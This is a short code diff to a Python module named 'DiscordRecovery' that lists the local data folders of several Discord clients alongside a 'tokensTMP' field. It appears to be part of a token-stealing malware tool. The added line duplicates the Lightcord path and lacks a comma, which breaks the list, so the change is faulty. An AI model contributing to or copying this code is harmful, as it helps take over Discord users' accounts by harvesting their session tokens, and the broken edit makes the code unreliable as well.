@@ -44,6 +44,7 @@ class DiscordRecovery(ModuleManager):
                 [f"{Constant.roaming_dir}/Lightcord","Lightcord"],
                 [f"{Constant.roaming_dir}/discordcanary","DiscordCanary"],
                 [f"{Constant.roaming_dir}/discordptb","DiscordPTB"]
+                [f"{Constant.roaming_dir}/Lightcord","LightCord"]
         ]
         
         self.tokensTMP = ''
